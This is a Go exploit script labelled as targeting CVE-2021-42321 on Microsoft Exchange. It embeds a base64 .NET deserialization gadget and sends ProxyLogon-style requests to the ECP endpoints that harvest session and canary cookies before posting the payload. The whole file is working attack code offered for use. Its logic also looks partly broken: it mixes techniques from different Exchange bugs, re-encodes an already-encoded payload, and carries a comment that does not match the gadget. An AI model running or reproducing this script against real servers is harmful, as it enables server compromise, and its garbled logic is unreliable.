package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

// pop calc or mspaint
var gadgetData = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAgAAAA9Gb3JlZ3JvdW5kQnJ1c2gPQmFja2dyb3VuZEJydXNoAQECAAAABgMAAABtPExpbmVhckdyYWRpZW50QnJ1c2ggeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiI+PC9MaW5lYXJHcmFkaWVudEJydXNoPgYEAAAA6w08UmVzb3VyY2VEaWN0aW9uYXJ5DQp4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIg0KeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQp4bWxuczpzPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiINCnhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkNvbmZpZ3VyYXRpb247YXNzZW1ibHk9U3lzdGVtLkNvbmZpZ3VyYXRpb24iDQp4bWxuczpyPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5SZWZsZWN0aW9uO2Fzc2VtYmx5PW1zY29ybGliIj4NCiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJ0eXBlIiBPYmplY3RUeXBlPSJ7eDpUeXBlIHM6VHlwZX0iIE1ldGhvZE5hbWU9IkdldFR5cGUiPg0KICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICA8czpTdHJpbmc+U3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLkFwcFNldHRpbmdzLCBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9zOlN0cmluZz4NCiAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJmaWVsZCIgT2JqZWN0SW5zdGFuY2U9IntTdGF0aWNSZXNvdXJjZSB0eXBlfSIgTWV0aG9kTmFtZT0iR2V0RmllbGQiPg0KICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICA8czpTdHJpbmc+ZGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgPHI6QmluZGluZ0ZsYWdzPjQwPC9yOkJpbmRpbmdGbGFncz4NCiAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgZmllbGR9IiBNZXRob2ROYW1lPSJTZXRWYWx1ZSI+DQogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgIDxzOk9iamVjdC8+DQogICAgICAgICAgICA8czpCb29sZWFuPnRydWU8L3M6Qm9vbGVhbj4NCiAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXRNZXRob2QiIE9iamVjdEluc3RhbmNlPSJ7eDpTdGF0aWMgYzpDb25maWd1cmF0aW9uTWFuYWdlci5BcHBTZXR0aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPg0KICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9kZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPg0KICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KPC9SZXNvdXJjZURpY3Rpb25hcnk+Cw==" // 替换字符串

func main() {
	fmt.Println("Usage: ./cve_2021_42321 url")
	url := os.Args[1]
	req, err := http.NewRequest("POST", url+"/ecp/default.aspx", nil)
	if err != nil {
		panic(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36")
	req.Header.Set("Cookie", "X-BEResource=Admin@MBX:444/ecp/proxyLogon.ecp?a=~1942062522;")
	req.Header.Set("msExchLogonMailbox", "S-1-5-20")
	req.Header.Set("msExchTargetMailbox", "S-1-5-20")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	fmt.Println(string(body))

	if resp.StatusCode == 200 {
		sid := resp.Header.Get("set-cookie")
		sid = sid[strings.Index(sid, "sid=")+4 : strings.Index(sid, "; path")]
		msExchEcpCanary := resp.Header.Get("set-cookie")
		msExchEcpCanary = msExchEcpCanary[strings.Index(msExchEcpCanary, "msExchEcpCanary=")+16 : strings.Index(msExchEcpCanary, "; path")]

		fmt.Println("[+] sid:", sid)
		fmt.Println("[+] msExchEcpCanary:", msExchEcpCanary)

		payload := gadgetData + "\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00" + "\x0c" + "\x02" + "\x00" + "\x01" + "\x71" + "\x36" + "\x03" + "\x03"
		payload = base64.StdEncoding.EncodeToString([]byte(payload))

		req2, err := http.NewRequest("POST", url+"/ecp/proxyLogon.ecp?a=~1942062522;", bytes.NewBufferString(payload))
		if err != nil {
			panic(err)
		}
		req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 AttackEx (KHTML, like Gecko) Version/5.1 Safari/534.50")
		req2.Header.Set("Cookie", fmt.Sprintf("X-BEResource=Admin@MBX:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&SID=%s;", msExchEcpCanary, sid))
		req2.Header.Set("msExchLogonMailbox", "S-1-5-20")
		req2.Header.Set("msExchTargetMailbox", "S-1-5-20")
		req2.Header.Set("Content-Type", "application/json")

		resp2, err := client.Do(req2)
		if err != nil {
			panic(err)
		}
		defer resp2.Body.Close()

		body2, err := ioutil.ReadAll(resp2.Body)
		if err != nil {
			panic(err)
		}

		fmt.Println("[+] The target might vulnerable.")
		fmt.Println(string(body2))
	}
}
